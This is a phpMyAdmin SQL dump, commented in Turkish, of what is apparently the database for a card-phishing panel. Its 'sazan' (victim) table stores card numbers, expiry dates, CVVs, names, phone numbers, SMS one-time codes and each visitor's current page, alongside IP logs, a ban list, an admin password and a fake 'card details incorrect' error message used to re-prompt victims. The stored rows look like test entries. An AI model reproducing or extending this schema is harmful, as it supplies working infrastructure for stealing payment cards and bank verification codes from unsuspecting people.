-- phpMyAdmin SQL Dump
-- version 5.1.3
-- https://www.phpmyadmin.net/
--
-- Anamakine: localhost:3306
-- Üretim Zamanı: 27 Ağu 2022, 11:10:57
-- Sunucu sürümü: 5.5.68-MariaDB
-- PHP Sürümü: 7.4.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Veritabanı: `rootcan`
--

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `back`
--

CREATE TABLE `back` (
  `back` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Tablo döküm verisi `back`
--

INSERT INTO `back` (`back`) VALUES
('95.173.233.230');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `ban`
--

CREATE TABLE `ban` (
  `ban` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Tablo döküm verisi `ban`
--

INSERT INTO `ban` (`ban`) VALUES
('188.57.5.233'),
('188.57.5.233');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `hata`
--

CREATE TABLE `hata` (
  `hata` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `ips`
--

CREATE TABLE `ips` (
  `id` bigint(20) NOT NULL,
  `ipAddress` varchar(255) NOT NULL,
  `lastOnline` bigint(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Tablo döküm verisi `ips`
--

INSERT INTO `ips` (`id`, `ipAddress`, `lastOnline`) VALUES
(1, '213.238.168.64', 1589461968),
(2, '78.159.101.116', 1589461981),
(3, '::1', 1626523755),
(4, '212.64.210.90', 1626852950),
(5, '88.234.185.185', 1626545784),
(6, '107.150.94.85', 1626549411),
(7, '31.223.46.39', 1626849391),
(8, '209.250.238.186', 1626854677),
(9, '185.40.86.71', 1626861371),
(10, '212.102.57.142', 1626870275),
(11, '20.64.178.221', 1636711771),
(12, '34.252.217.247', 1636355207),
(13, '176.88.133.66', 1636355850),
(14, '20.105.161.56', 1636360260),
(15, '78.166.184.116', 1636361110),
(16, '78.174.65.99', 1636364268),
(17, '212.154.4.49', 1636364292),
(18, '34.248.18.41', 1636710169),
(19, '176.55.67.147', 1636561498),
(20, '185.191.206.152', 1636647406),
(21, '185.123.101.84', 1636561020),
(22, '95.10.19.200', 1636561916),
(23, '65.154.226.165', 1636612166),
(24, '212.154.4.225', 1636646524),
(25, '176.30.181.150', 1636654125),
(26, '185.191.206.153', 1636709414),
(27, '20.117.99.105', 1661591463),
(28, '20.13.162.11', 1661591393);

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `max`
--

CREATE TABLE `max` (
  `max` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `pin`
--

CREATE TABLE `pin` (
  `pin` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `priv`
--

CREATE TABLE `priv` (
  `priv` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Tablo döküm verisi `priv`
--

INSERT INTO `priv` (`priv`) VALUES
('1'),
('4');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `sazan`
--

CREATE TABLE `sazan` (
  `id` int(11) NOT NULL,
  `date` varchar(255) NOT NULL,
  `kk` varchar(255) NOT NULL,
  `info` varchar(255) NOT NULL,
  `sonkul` varchar(255) NOT NULL,
  `cvv` int(11) NOT NULL,
  `ad` varchar(255) CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL,
  `phone` varchar(255) NOT NULL,
  `money` varchar(255) NOT NULL,
  `sms` varchar(255) NOT NULL,
  `now` varchar(255) CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL DEFAULT 'Anasayfada',
  `sound` int(11) NOT NULL DEFAULT '0',
  `back` int(11) NOT NULL DEFAULT '0',
  `go` int(11) NOT NULL DEFAULT '0',
  `ip` varchar(255) NOT NULL,
  `lastOnline` bigint(20) DEFAULT NULL,
  `bozsms` varchar(255) CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Tablo döküm verisi `sazan`
--

INSERT INTO `sazan` (`id`, `date`, `kk`, `info`, `sonkul`, `cvv`, `ad`, `phone`, `money`, `sms`, `now`, `sound`, `back`, `go`, `ip`, `lastOnline`, `bozsms`) VALUES
(11, '27.08.2022 12:02', '6546 5465 4654 6546', '55555', '46/54', 465, ' soyak', '+90 (544) 654 6546', '50', '5555555', 'Hatalı Sms Sayfası', 0, 0, 0, '20.117.99.105', 1661591463, ''),
(12, '27.08.2022 12:09', '5345 3453 4534 5435', '4234232324', '34/53', 534, 'sad sad', '+90 (534) 534 5345', '10', '2342342', 'Hatalı Sms Sayfası', 0, 0, 0, '20.13.162.11', 1661591393, '4242343');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `site`
--

CREATE TABLE `site` (
  `id` int(11) NOT NULL,
  `pass` text NOT NULL,
  `privpage` text CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL,
  `refresh` int(11) NOT NULL DEFAULT '5',
  `go` int(11) NOT NULL DEFAULT '0',
  `3d` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Tablo döküm verisi `site`
--

INSERT INTO `site` (`id`, `pass`, `privpage`, `refresh`, `go`, `3d`) VALUES
(1, '31', 'Kart bilgileriniz hatalı görünüyor. Doğru girdiğinizden Emin Olun. İŞLEMİNİZİ TAMAMLAYAMADIK!', 4, 0, 0);

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `sms`
--

CREATE TABLE `sms` (
  `sms` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `sms2`
--

CREATE TABLE `sms2` (
  `sms2` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `tebrik`
--

CREATE TABLE `tebrik` (
  `tebrik` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dökümü yapılmış tablolar için indeksler
--

--
-- Tablo için indeksler `ips`
--
ALTER TABLE `ips`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `sazan`
--
ALTER TABLE `sazan`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `site`
--
ALTER TABLE `site`
  ADD PRIMARY KEY (`id`);

--
-- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
--

--
-- Tablo için AUTO_INCREMENT değeri `ips`
--
ALTER TABLE `ips`
  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=29;

--
-- Tablo için AUTO_INCREMENT değeri `sazan`
--
ALTER TABLE `sazan`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- Tablo için AUTO_INCREMENT değeri `site`
--
ALTER TABLE `site`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
